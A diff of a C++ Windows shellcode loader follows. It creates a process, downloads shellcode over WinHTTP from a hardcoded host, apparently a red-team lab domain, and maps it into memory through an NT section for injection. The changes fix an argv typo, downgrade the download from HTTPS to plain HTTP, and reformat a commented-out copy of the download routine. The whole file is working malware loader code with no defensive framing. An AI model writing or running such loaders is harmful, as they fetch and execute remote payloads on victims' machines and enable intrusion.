@@ -10,7 +10,6 @@
 
 std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename);
 
-
 int main(int argc, char *argv[])
 {
     // create startup info struct
@@ -38,7 +37,7 @@ int main(int argc, char *argv[])
         process_info);
 
     // download shellcode
-    std::string p = arv[1];
+    std::string p = argv[1];
     std::wstring ptemp = std::wstring(p.begin(), p.end());
     std::vector<BYTE> shellcode = Download(L"www.infinity-bank.com\0", ptemp.c_str());
 
@@ -50,7 +49,7 @@ int main(int argc, char *argv[])
 
     // create section in local process
     HANDLE hSection;
-    LARGE_INTEGER szSection = { shellcode.size() };
+    LARGE_INTEGER szSection = {shellcode.size()};
 
     NTSTATUS status = ntCreateSection(
         &hSection,
@@ -113,7 +112,6 @@ int main(int argc, char *argv[])
         hLocalAddress);
 }
 
-
 std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename) {
 
     // initialise session
@@ -122,13 +120,15 @@ std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename) {
         WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,    // proxy aware
         WINHTTP_NO_PROXY_NAME,
         WINHTTP_NO_PROXY_BYPASS,
-        WINHTTP_FLAG_SECURE_DEFAULTS);          // enable ssl
+        //WINHTTP_FLAG_SECURE_DEFAULTS);          // enable ssl
+        0);
 
     // create session for target
     HINTERNET hConnect = WinHttpConnect(
         hSession,
         baseAddress,
-        INTERNET_DEFAULT_HTTPS_PORT,            // port 443
+        //INTERNET_DEFAULT_HTTPS_PORT,            // port 443
+        INTERNET_DEFAULT_HTTP_PORT,            // port 443
         0);
 
     // create request handle
@@ -139,7 +139,8 @@ std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename) {
         NULL,
         WINHTTP_NO_REFERER,
         WINHTTP_DEFAULT_ACCEPT_TYPES,
-        WINHTTP_FLAG_SECURE);                   // ssl
+        //WINHTTP_FLAG_SECURE);                   // ssl
+        0);
 
     // send the request
     WinHttpSendRequest(
@@ -178,70 +179,68 @@ std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename) {
 
     return buffer;
 }
-//std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename) {
 
-    // initialise session
-//    HINTERNET hSession = WinHttpOpen(
-//        NULL,
-//        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,    // proxy aware
-//        WINHTTP_NO_PROXY_NAME,
-//        WINHTTP_NO_PROXY_BYPASS,
-        //WINHTTP_FLAG_SECURE_DEFAULTS);          // enable ssl
-//        0);
+// std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename) {
 
-    // create session for target
-//    HINTERNET hConnect = WinHttpConnect(
-//        hSession,
-//        baseAddress,
-//        //INTERNET_DEFAULT_HTTPS_PORT,            // port 443
-//        INTERNET_DEFAULT_HTTP_PORT,            // port 443
-//        0);
+//     // initialise session
+//     HINTERNET hSession = WinHttpOpen(
+//         NULL,
+//         WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,    // proxy aware
+//         WINHTTP_NO_PROXY_NAME,
+//         WINHTTP_NO_PROXY_BYPASS,
+//         WINHTTP_FLAG_SECURE_DEFAULTS);          // enable ssl
 
-    // create request handle
-//    HINTERNET hRequest = WinHttpOpenRequest(
-//        hConnect,
-//        L"GET",
-//        filename,
-//        NULL,
-//        WINHTTP_NO_REFERER,
-//        WINHTTP_DEFAULT_ACCEPT_TYPES,
-//        //WINHTTP_FLAG_SECURE);                   // ssl
-//        0);
+//     // create session for target
+//     HINTERNET hConnect = WinHttpConnect(
+//         hSession,
+//         baseAddress,
+//         INTERNET_DEFAULT_HTTPS_PORT,            // port 443
+//         0);
 
-    // send the request
-//    WinHttpSendRequest(
-//        hRequest,
-//        WINHTTP_NO_ADDITIONAL_HEADERS,
-//        0,
-//        WINHTTP_NO_REQUEST_DATA,
-//        0,
-//        0,
-//        0);
+//     // create request handle
+//     HINTERNET hRequest = WinHttpOpenRequest(
+//         hConnect,
+//         L"GET",
+//         filename,
+//         NULL,
+//         WINHTTP_NO_REFERER,
+//         WINHTTP_DEFAULT_ACCEPT_TYPES,
+//         WINHTTP_FLAG_SECURE);                   // ssl
 
-    // receive response
-//    WinHttpReceiveResponse(
-//        hRequest,
-//        NULL);
+//     // send the request
+//     WinHttpSendRequest(
+//         hRequest,
+//         WINHTTP_NO_ADDITIONAL_HEADERS,
+//         0,
+//         WINHTTP_NO_REQUEST_DATA,
+//         0,
+//         0,
+//         0);
 
-    // read the data
-//    std::vector<BYTE> buffer;
-//    DWORD bytesRead = 0;
+//     // receive response
+//     WinHttpReceiveResponse(
+//         hRequest,
+//         NULL);
 
-//    do {
+//     // read the data
+//     std::vector<BYTE> buffer;
+//     DWORD bytesRead = 0;
 
-//        BYTE temp[4096]{};
-//        WinHttpReadData(hRequest, temp, sizeof(temp), &bytesRead);
+//     do {
 
-//        if (bytesRead > 0) {
-//            buffer.insert(buffer.end(), temp, temp + bytesRead);
-//        }
+//         BYTE temp[4096]{};
+//         WinHttpReadData(hRequest, temp, sizeof(temp), &bytesRead);
 
-//    } while (bytesRead > 0);
+//         if (bytesRead > 0) {
+//             buffer.insert(buffer.end(), temp, temp + bytesRead);
+//         }
 
-    // close all the handles
-//    WinHttpCloseHandle(hRequest);
-//    WinHttpCloseHandle(hConnect);
-//    WinHttpCloseHandle(hSession);
+//     } while (bytesRead > 0);
 
-//    return buffer;
-//}
+//     // close all the handles
+//     WinHttpCloseHandle(hRequest);
+//     WinHttpCloseHandle(hConnect);
+//     WinHttpCloseHandle(hSession);
+
+//     return buffer;
+// }
